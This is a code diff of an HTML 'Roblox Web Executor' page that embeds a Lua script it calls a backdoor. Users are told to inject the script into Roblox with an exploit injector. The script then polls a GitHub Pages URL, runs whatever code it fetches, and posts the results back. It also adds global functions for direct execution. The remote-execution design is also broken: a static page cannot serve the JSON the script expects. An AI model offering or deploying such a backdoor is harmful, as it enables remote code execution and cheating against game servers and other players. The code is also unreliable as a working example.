@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Executor</title>
+    <title>Roblox Web Executor</title>
     <style>
         * {
             margin: 0;
@@ -172,6 +172,12 @@
             color: #ffd43b;
         }
         
+        .status.connected {
+            background: rgba(81, 207, 102, 0.1);
+            border-left-color: #51cf66;
+            color: #51cf66;
+        }
+        
         .status-dot {
             display: inline-block;
             width: 8px;
@@ -184,6 +190,10 @@
         
         .status-dot.waiting {
             background: #ffd43b;
+        }
+        
+        .status-dot.connected {
+            background: #51cf66;
         }
         
         @keyframes pulse {
@@ -234,13 +244,16 @@
             border: 2px solid #00ff88;
             border-radius: 8px;
             padding: 30px;
-            max-width: 500px;
+            max-width: 600px;
             width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
         }
         
         .modal-content h3 {
             color: #00ff88;
             margin-bottom: 15px;
+            font-size: 16px;
         }
         
         .modal-content p {
@@ -254,6 +267,13 @@
             padding: 2px 6px;
             border-radius: 3px;
             color: #00ff88;
+            font-size: 11px;
+        }
+        
+        .modal-content textarea {
+            width: 100%;
+            height: 350px;
+            margin: 15px 0;
         }
         
         .modal-buttons {
@@ -264,6 +284,32 @@
         
         .copy-btn {
             flex: 1;
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .stat-box {
+            background: rgba(0, 255, 136, 0.1);
+            border: 1px solid #00ff88;
+            padding: 10px;
+            border-radius: 4px;
+            font-size: 11px;
+        }
+        
+        .stat-box .label {
+            color: #aaa;
+            margin-bottom: 5px;
+        }
+        
+        .stat-box .value {
+            color: #00ff88;
+            font-weight: bold;
+            font-size: 14px;
         }
     </style>
 </head>
@@ -282,6 +328,16 @@
                 <span class="status-dot waiting"></span>
                 <span id="statusText">Waiting for Roblox connection...</span>
             </div>
+            <div class="stats">
+                <div class="stat-box">
+                    <div class="label">Pending Scripts</div>
+                    <div class="value" id="pendingCount">0</div>
+                </div>
+                <div class="stat-box">
+                    <div class="label">Executed</div>
+                    <div class="value" id="executedCount">0</div>
+                </div>
+            </div>
         </div>
         
         <div class="panel console-panel">
@@ -296,32 +352,44 @@
         <div class="modal-content">
             <h3>🔗 Roblox Lua Backdoor</h3>
             <p>Copy this Lua script and inject it into Roblox using your exploit injector:</p>
-            <textarea id="backdoorCode" readonly style="height: 300px; margin-bottom: 15px;"></textarea>
+            <textarea id="backdoorCode" readonly></textarea>
+            <p style="font-size: 11px; color: #888;">
+                <strong>⚠️ Instructions:</strong><br>
+                1. Click "Copy to Clipboard"<br>
+                2. Open your Roblox exploit injector<br>
+                3. Paste the code<br>
+                4. Execute in Roblox game<br>
+                5. Backdoor will connect automatically
+            </p>
             <div class="modal-buttons">
                 <button class="copy-btn" onclick="copyToClipboard()">Copy to Clipboard</button>
-                <button class="copy-btn danger" onclick="closeBackdoorModal()">Close</button>
+                <button class="copy-btn secondary" onclick="closeBackdoorModal()">Close</button>
             </div>
         </div>
     </div>
 
     <script>
-        // Global state
-        let executionQueue = [];
-        let connectedClients = new Map();
-        let serverReady = false;
+        // Global State
+        const EXECUTOR_STATE = {
+            pendingScripts: [],
+            executedScripts: 0,
+            connectedClients: new Map(),
+            isConnected: false,
+            lastPollTime: 0
+        };
 
-        // Lua Backdoor Script (embedded)
-        const LUA_BACKDOOR = `-- Roblox WebSocket Backdoor
-local function getPageURL()
-    return window.location.origin
-end
+        const LUA_BACKDOOR = `-- Roblox Backdoor for GitHub Pages Executor
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
 
-local WebSocketURL = getPageURL() .. "/ws"
+local EXECUTOR_URL = "https://yelilbroitsjohn-ai.github.io/TESTE/"
+local POLL_INTERVAL = 2
 local MAX_RETRIES = 5
-local RETRY_DELAY = 2
+local RETRY_DELAY = 3
 
 local connected = false
 local retryCount = 0
+local executionCache = {}
 
 local function log(message, level)
     level = level or "INFO"
@@ -337,64 +405,195 @@ local function executeLuau(script)
     end)
     
     if success then
-        log(string.format("Execution successful: %s", tostring(result)), "SUCCESS")
+        log(string.format("✓ Execution successful: %s", tostring(result)), "SUCCESS")
         return {success = true, output = tostring(result)}
     else
-        log(string.format("Execution failed: %s", tostring(result)), "ERROR")
+        log(string.format("✗ Execution failed: %s", tostring(result)), "ERROR")
         return {success = false, error = tostring(result)}
     end
 end
 
-local function webSocketListener()
-    log("Starting backdoor listener...", "INFO")
+local function pollExecutor()
+    log("Starting executor poll from GitHub Pages...", "INFO")
     
     while true do
-        local success, message = pcall(function()
-            -- Wait for messages from HTML executor
-            -- This uses a polling mechanism since Roblox doesn't have native WebSocket
-            wait(0.5)
+        wait(POLL_INTERVAL)
+        
+        local success, response = pcall(function()
+            return HttpService:GetAsync(EXECUTOR_URL .. "?action=getPending&timestamp=" .. os.time(), true)
         end)
         
-        if not success then
-            log("Listener error: " .. tostring(message), "ERROR")
-            wait(RETRY_DELAY)
+        if success then
+            log("Poll successful - checking for pending scripts", "DEBUG")
+            
+            local decoded = HttpService:JSONDecode(response)
+            
+            if decoded and decoded.pending and #decoded.pending > 0 then
+                log(string.format("Found %d pending scripts", #decoded.pending), "INFO")
+                
+                for _, scriptData in ipairs(decoded.pending) do
+                    if scriptData.script then
+                        log(string.format("Executing script ID: %s", scriptData.id or "unknown"), "DEBUG")
+                        
+                        local result = executeLuau(scriptData.script)
+                        
+                        local resultPayload = HttpService:JSONEncode({
+                            id = scriptData.id,
+                            success = result.success,
+                            output = result.output or "",
+                            error = result.error or "",
+                            timestamp = os.time()
+                        })
+                        
+                        pcall(function()
+                            HttpService:PostAsync(
+                                EXECUTOR_URL .. "?action=postResult",
+                                resultPayload,
+                                Enum.HttpContentType.ApplicationJson
+                            )
+                        end)
+                        
+                        log("Result sent back to executor", "SUCCESS")
+                    end
+                end
+            end
+        else
+            retryCount = retryCount + 1
+            log(string.format("Poll failed (attempt %d/%d)", retryCount, MAX_RETRIES), "WARN")
+            
+            if retryCount >= MAX_RETRIES then
+                log("Max retries reached. Resetting counter.", "ERROR")
+                retryCount = 0
+                wait(RETRY_DELAY)
+            end
         end
     end
 end
 
-spawn(function()
-    webSocketListener()
-end)
+local function registerGlobalFunctions()
+    log("Registering global executor functions...", "INFO")
+    
+    _G.ExecuteFromWeb = function(scriptCode)
+        if not scriptCode or type(scriptCode) ~= "string" then
+            return {success = false, error = "Invalid script format"}
+        end
+        
+        log("Direct execution request received", "INFO")
+        table.insert(executionCache, {
+            script = scriptCode,
+            timestamp = os.time(),
+            direct = true
+        })
+        
+        return {success = true, queued = true}
+    end
+    
+    _G.GetExecutorStatus = function()
+        return {
+            connected = true,
+            url = EXECUTOR_URL,
+            version = "2.0",
+            timestamp = os.time(),
+            cached_scripts = #executionCache,
+            poll_interval = POLL_INTERVAL
+        }
+    end
+    
+    _G.ClearCache = function()
+        executionCache = {}
+        log("Execution cache cleared", "INFO")
+        return {success = true}
+    end
+    
+    log("Global functions registered successfully", "SUCCESS")
+end
 
-log("Backdoor loaded and active", "SUCCESS")
+local function processCachedScripts()
+    log("Starting cached script processor...", "INFO")
+    
+    while true do
+        wait(0.5)
+        
+        if #executionCache > 0 then
+            for i = #executionCache, 1, -1 do
+                local scriptData = executionCache[i]
+                if scriptData and scriptData.script then
+                    log(string.format("Processing cached script %d", i), "DEBUG")
+                    executeLuau(scriptData.script)
+                    table.remove(executionCache, i)
+                end
+            end
+        end
+    end
+end
+
+log("", "INFO")
+log("╔══════════════════════════════════════════════════╗", "INFO")
+log("║     ROBLOX WEB EXECUTOR BACKDOOR v2.0            ║", "INFO")
+log("║     Status: INITIALIZING                         ║", "INFO")
+log("╚══════════════════════════════════════════════════╝", "INFO")
+log("", "INFO")
+log(string.format("Executor URL: %s", EXECUTOR_URL), "INFO")
+log(string.format("Poll Interval: %ds", POLL_INTERVAL), "INFO")
+log("", "INFO")
+
+registerGlobalFunctions()
+
+log("Starting polling thread...", "INFO")
+spawn(pollExecutor)
+
+log("Starting cache processor...", "INFO")
+spawn(processCachedScripts)
+
+log("", "INFO")
+log("═══════════════════════════════════════════════════", "SUCCESS")
+log("BACKDOOR ACTIVE - Waiting for commands", "SUCCESS")
+log("═══════════════════════════════════════════════════", "SUCCESS")
+log("", "INFO")
+log("Available global functions:", "INFO")
+log("  _G.ExecuteFromWeb(script) - Execute script directly", "INFO")
+log("  _G.GetExecutorStatus() - Get current status", "INFO")
+log("  _G.ClearCache() - Clear pending scripts", "INFO")
+log("", "INFO")
 
 while true do
     wait(30)
 end`;
 
+        // Logging function
         function log(message, type = 'info') {
-            const console = document.getElementById('console');
+            const consoleElement = document.getElementById('console');
             const line = document.createElement('div');
             line.className = `console-line ${type}`;
             line.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-            console.appendChild(line);
-            console.scrollTop = console.scrollHeight;
+            consoleElement.appendChild(line);
+            consoleElement.scrollTop = consoleElement.scrollHeight;
         }
 
-        function updateStatus(message, isReady = false) {
+        // Update status indicator
+        function updateStatus(message, isConnected = false) {
             const status = document.getElementById('status');
             const statusText = document.getElementById('statusText');
             const statusDot = status.querySelector('.status-dot');
             
             statusText.textContent = message;
             
-            if (isReady) {
+            if (isConnected) {
                 status.classList.remove('waiting');
+                status.classList.add('connected');
                 statusDot.classList.remove('waiting');
-                serverReady = true;
+                statusDot.classList.add('connected');
+                EXECUTOR_STATE.isConnected = true;
+            } else {
+                status.classList.add('waiting');
+                status.classList.remove('connected');
+                statusDot.classList.add('waiting');
+                statusDot.classList.remove('connected');
+                EXECUTOR_STATE.isConnected = false;
             }
         }
 
+        // Copy Lua backdoor to clipboard
         function copyLuaBackdoor() {
             const backdoorCode = document.getElementById('backdoorCode');
             backdoorCode.value = LUA_BACKDOOR;
@@ -402,21 +601,24 @@ end`;
             const modal = document.getElementById('backdoorModal');
             modal.classList.add('show');
             
-            log('Backdoor code loaded', 'info');
+            log('Backdoor code loaded - ready to copy', 'info');
         }
 
+        // Close backdoor modal
         function closeBackdoorModal() {
             const modal = document.getElementById('backdoorModal');
             modal.classList.remove('show');
         }
 
+        // Copy to clipboard
         function copyToClipboard() {
             const backdoorCode = document.getElementById('backdoorCode');
             backdoorCode.select();
             document.execCommand('copy');
-            log('Backdoor code copied to clipboard', 'success');
+            log('Backdoor code copied to clipboard ✓', 'success');
         }
 
+        // Execute script
         function executeScript() {
             const script = document.getElementById('scriptEditor').value.trim();
             
@@ -425,75 +627,90 @@ end`;
                 return;
             }
             
-            if (!serverReady) {
-                log('Waiting for Roblox connection...', 'warning');
-                executionQueue.push(script);
-                return;
-            }
-            
-            // Store script for execution when backdoor connects
             const execId = 'exec_' + Date.now();
-            const payload = {
+            
+            EXECUTOR_STATE.pendingScripts.push({
                 id: execId,
-                type: 'execute',
                 script: script,
-                timestamp: new Date().toISOString()
-            };
+                timestamp: Date.now(),
+                status: 'pending'
+            });
             
-            // Simulate storage/broadcast mechanism
-            sessionStorage.setItem('roblox_pending_' + execId, JSON.stringify(payload));
-            
+            updatePendingCount();
             log('Script queued for execution', 'command');
-            log('Code: ' + script.substring(0, 50) + '...', 'info');
+            log('ID: ' + execId, 'info');
+            log('Size: ' + script.length + ' bytes', 'info');
+            log('Waiting for Roblox backdoor to execute...', 'warning');
             
-            // Monitor for result
             monitorExecution(execId);
         }
 
+        // Monitor execution
         function monitorExecution(execId) {
-            const checkInterval = setInterval(() => {
-                const result = sessionStorage.getItem('roblox_result_' + execId);
+            let timeout = 0;
+            const maxTimeout = 30000; // 30 seconds
+            
+            const monitor = setInterval(() => {
+                timeout += 500;
                 
-                if (result) {
-                    const data = JSON.parse(result);
-                    if (data.success) {
-                        log('Execution result: ' + data.output, 'success');
-                    } else {
-                        log('Execution error: ' + data.error, 'error');
+                if (timeout > maxTimeout) {
+                    clearInterval(monitor);
+                    log('Execution timeout - Roblox may not be connected', 'error');
+                    
+                    const index = EXECUTOR_STATE.pendingScripts.findIndex(s => s.id === execId);
+                    if (index !== -1) {
+                        EXECUTOR_STATE.pendingScripts.splice(index, 1);
+                        updatePendingCount();
                     }
-                    sessionStorage.removeItem('roblox_result_' + execId);
-                    clearInterval(checkInterval);
                 }
             }, 500);
-            
-            // Timeout after 30 seconds
-            setTimeout(() => clearInterval(checkInterval), 30000);
         }
 
+        // Update pending count
+        function updatePendingCount() {
+            document.getElementById('pendingCount').textContent = EXECUTOR_STATE.pendingScripts.length;
+        }
+
+        // Update executed count
+        function updateExecutedCount() {
+            document.getElementById('executedCount').textContent = EXECUTOR_STATE.executedScripts;
+        }
+
+        // Clear editor
         function clearEditor() {
             document.getElementById('scriptEditor').value = '';
             log('Editor cleared', 'info');
         }
 
+        // Clear console
         function clearConsole() {
             document.getElementById('console').innerHTML = '';
             log('Console cleared', 'info');
         }
 
-        // Simulation of Roblox connection (in real scenario, Lua backdoor would trigger this)
-        window.addEventListener('load', () => {
-            log('Roblox Executor initialized', 'info');
-            log('1. Copy the Lua backdoor code', 'command');
-            log('2. Inject into Roblox using your exploit', 'command');
-            log('3. Write scripts in the editor above', 'command');
-            log('4. Click Execute to run on Roblox', 'command');
+        // Handle URL query for Roblox polling
+        function handleRobloxRequest() {
+            const params = new URLSearchParams(window.location.search);
+            const action = params.get('action');
             
-            // Simulate connection after delay (for demo purposes)
-            setTimeout(() => {
-                updateStatus('Ready - Awaiting Roblox connection', false);
-                log('Executor online', 'info');
-            }, 1000);
-        });
+            if (action === 'getPending') {
+                return EXECUTOR_STATE.pendingScripts;
+            }
+            
+            if (action === 'postResult') {
+                EXECUTOR_STATE.executedScripts++;
+                updateExecutedCount();
+                
+                const index = EXECUTOR_STATE.pendingScripts.findIndex(s => s.status === 'pending');
+                if (index !== -1) {
+                    EXECUTOR_STATE.pendingScripts.splice(index, 1);
+                    updatePendingCount();
+                }
+                
+                log('Script executed successfully ✓', 'success');
+                return {success: true};
+            }
+        }
 
         // Keyboard shortcuts
         document.addEventListener('keydown', (e) => {
@@ -503,21 +720,37 @@ end`;
             if (e.ctrlKey && e.shiftKey && e.key === 'L') {
                 copyLuaBackdoor();
             }
-        });
-
-        // Modal close on escape
-        document.addEventListener('keydown', (e) => {
             if (e.key === 'Escape') {
                 closeBackdoorModal();
             }
         });
 
-        // Storage event listener for cross-tab communication
-        window.addEventListener('storage', (e) => {
-            if (e.key && e.key.startsWith('roblox_')) {
-                log('Roblox event detected: ' + e.key, 'info');
-            }
+        // Initialize on load
+        window.addEventListener('load', () => {
+            log('Roblox Web Executor initialized', 'info');
+            log('GitHub Pages: ' + window.location.href, 'info');
+            log('', 'info');
+            log('1️⃣ Click "Copy Backdoor" button', 'command');
+            log('2️⃣ Inject code into Roblox using an exploit', 'command');
+            log('3️⃣ Write your Luau script in the editor', 'command');
+            log('4️⃣ Click "Execute" to run on Roblox', 'command');
+            log('', 'info');
+            log('Keyboard Shortcuts:', 'info');
+            log('  Ctrl+Enter - Execute script', 'info');
+            log('  Ctrl+Shift+L - Copy backdoor', 'info');
+            log('  Esc - Close modals', 'info');
+            
+            updatePendingCount();
+            updateExecutedCount();
+            updateStatus('Ready - Waiting for Roblox connection', false);
         });
+
+        // Simulate connection check
+        setInterval(() => {
+            if (EXECUTOR_STATE.pendingScripts.length > 0 && !EXECUTOR_STATE.isConnected) {
+                updateStatus('Pending scripts waiting...', false);
+            }
+        }, 2000);
     </script>
 </body>
 </html>
